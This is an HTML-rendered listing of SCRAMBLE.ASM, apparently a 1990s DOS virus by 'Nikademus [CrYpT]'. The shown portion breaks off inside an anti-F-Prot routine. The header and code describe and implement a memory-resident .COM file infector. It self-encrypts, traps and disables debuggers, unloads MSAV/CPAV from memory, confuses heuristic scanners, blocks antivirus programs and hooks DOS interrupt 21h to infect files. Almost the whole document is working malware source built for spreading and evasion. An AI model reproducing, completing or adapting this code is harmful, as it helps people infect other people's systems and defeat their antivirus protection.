<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>SCRAMBLE.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; SCRAMBLE --- Memory resident .COM infector.               </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Uses many methods to slip through heuristic and standard virus scanners.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; #1    Pulls MSAV and CPAV out of memory.</span><span class="sc0">
</span><span class="sc1">; #2    Has self modifying JMP at the beginning to confuse TBAV</span><span class="sc0">
</span><span class="sc1">; #3    Has the anti-fprot code from YB-X inside.</span><span class="sc0">
</span><span class="sc1">; #4    Doesn't let many known AV products run.  It doesn't delete them </span><span class="sc0">
</span><span class="sc1">;       unlike earlier projects.</span><span class="sc0">
</span><span class="sc1">; #5    Includes filters in the infection process to exclude possible "bait"</span><span class="sc0">
</span><span class="sc1">;       files.</span><span class="sc0">
</span><span class="sc1">; #6    Uses the System File Tables for infection.  This is a beautiful method</span><span class="sc0">
</span><span class="sc1">;       to get alot of file information quickly.</span><span class="sc0">
</span><span class="sc1">; #7    Utilizes directory stealth. (FCB only)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Features:  Infects on 11h, 12h, and 4Bh. (Directory and Execute)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Also SCRAMBLE includes many debuggers traps.  They are concentrated in</span><span class="sc0">
</span><span class="sc1">; the beginning.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                             Nikademus [CrYpT]</span><span class="sc0">
</span><span class="sc1">;                                                       ^^^^^^^</span><span class="sc0">
</span><span class="sc1">;                                                       Smile Urnst....</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ********************** [Scramble] ***************************************               </span><span class="sc0">
        
        </span><span class="sc9">.radix</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
     </span><span class="sc5">code</span><span class="sc0">       </span><span class="sc9">segment</span><span class="sc0">
        </span><span class="sc5">model</span><span class="sc0">  </span><span class="sc10">small</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">len</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">     </span><span class="sc1">; Shadows length</span><span class="sc0">
</span><span class="sc5">vir_len</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">len</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16d</span><span class="sc0">               </span><span class="sc1">; paragraphs of memory needed</span><span class="sc0">
</span><span class="sc5">encryptlength</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; encrypt all but 3 bytes</span><span class="sc0">


</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">  
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BBh</span><span class="sc0">                  </span><span class="sc1">; mov bx, xxxx</span><span class="sc0">
</span><span class="sc5">off_start</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">          </span><span class="sc1">; this is fixed up during inf.</span><span class="sc0">
</span><span class="sc5">xor_start</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;             </span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc0">                   </span><span class="sc1">; XOR WORD PTR [BX], ????h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">37h</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">e_v</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">                 </span><span class="sc1">; encryption word</span><span class="sc0">
                          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                    </span><span class="sc1">;      </span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                    </span><span class="sc1">;                 </span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FBh</span><span class="sc0">             </span><span class="sc1">; cmp bx, xxxx</span><span class="sc0">
</span><span class="sc5">off_last</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jng</span><span class="sc0">     </span><span class="sc5">xor_start</span><span class="sc0">             </span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">inner_loop</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'BEER and TEQUILA forever !'</span><span class="sc0"> </span><span class="sc1">; I love a good joke...</span><span class="sc0">
</span><span class="sc5">inner_loop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">start_2</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin_2</span><span class="sc0">         </span><span class="sc1">; Inner encryption loop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin_2</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Save part of int 3</span><span class="sc0">
</span><span class="sc5">ax_encrypt</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">                  </span><span class="sc1">; encryption word</span><span class="sc0">
</span><span class="sc5">encrypt_loop_2</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">; save cx on part of int 3</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; clear cx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">                     </span><span class="sc1">; The purpose of this </span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; encryption is to be</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">                     </span><span class="sc1">; a pain </span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; for people wanting to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; trace.  </span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encrypt_loop_2</span><span class="sc0">             </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc5">begin_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">; restore int 3</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">             
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'[Scramble] By Nikademus $'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'Read CRYPT Today!. $'</span><span class="sc0">
</span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">     
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5945h</span><span class="sc0">                </span><span class="sc1">; pull CPAV (MSAV)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64001d</span><span class="sc0">               </span><span class="sc1">; out of memory</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">16h</span><span class="sc0">                      </span><span class="sc1">; This also confused</span><span class="sc0">
                         </span><span class="sc1">; TBCLEAN </span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">bp_fixup</span><span class="sc0">                 </span><span class="sc1">; bp fixup </span><span class="sc0">
</span><span class="sc5">bp_fixup</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                       </span><span class="sc1">;       </span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bp_fixup</span><span class="sc0">      </span><span class="sc1">;                   </span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">01h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Installation Check</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">03h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; int 01 and 03 are normally</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; equal.  Shadow changes</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">next_early</span><span class="sc0">               </span><span class="sc1">; int 3h.</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fix_host</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">next_early</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; zero out 1 and 3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; Debugger fix...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; We hatesss Debuggersss</span><span class="sc0">
                         </span><span class="sc1">; Don't we Preciousss.</span><span class="sc0">
                         </span><span class="sc1">;          - Tolkien</span><span class="sc0">
         
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">; confusing f-protect's</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">; heuristic scanning</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">; Still effective as of</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">; version 2.10</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">; [cf] Crypt Newsletter 18</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">; for explanation &amp; </span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">; rationale</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">screw_fprot</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Memory_manipulation</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                    </span><span class="sc1">; reduce memory size     </span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                       </span><span class="sc1">;    </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                    </span><span class="sc1">; My standard memory  </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0000</span><span class="sc4">],</span><span class="sc2">5a</span><span class="sc0">    </span><span class="sc1">; routine...   </span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fix_host</span><span class="sc0">                 </span><span class="sc1">;         </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0003</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;   </span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">; # of 16byte paragraphs      </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0003</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">; to grab (4k)</span><span class="sc0">
</span><span class="sc5">Mov_to_unused_memory</span><span class="sc4">:</span><span class="sc0">  
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; copy self to the new</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                   </span><span class="sc1">; 'unused' part of memory    </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; QEMM calls this area   </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; unused when Shadow is</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">len</span><span class="sc0">                  </span><span class="sc1">; resident.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">;   </span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;          </span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">0100</span><span class="sc0">              </span><span class="sc1">;   </span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                    </span><span class="sc1">;   </span><span class="sc0">

</span><span class="sc5">Interrupt_Manipulation</span><span class="sc4">:</span><span class="sc0">                                          
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                    
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; get int 21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">old_21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; save 21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">old_21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                    </span><span class="sc1">; bx = ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; put old 21 in int 3h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Scramble</span><span class="sc0"> </span><span class="sc1">; put self in 21 </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">fix_host</span><span class="sc4">:</span><span class="sc0">     
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                  </span><span class="sc1">; Replace overwritten bytes   </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                       </span><span class="sc1">; Save the 100h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">vict_head</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;         </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25d</span><span class="sc0">                  </span><span class="sc1">;  </span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                    </span><span class="sc1">; Fix 'em</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; Clean up after myself.</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Bye_Bye</span><span class="sc4">:</span><span class="sc0"> 
        </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">; Return to 100h</span><span class="sc0">
</span><span class="sc5">screw_fprot</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">;  Pseudo-nested calls to confuse</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw2</span><span class="sc0">                </span><span class="sc1">;  f-protect's heuristic</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw2</span><span class="sc0">                </span><span class="sc1">;  analysis</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw2</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
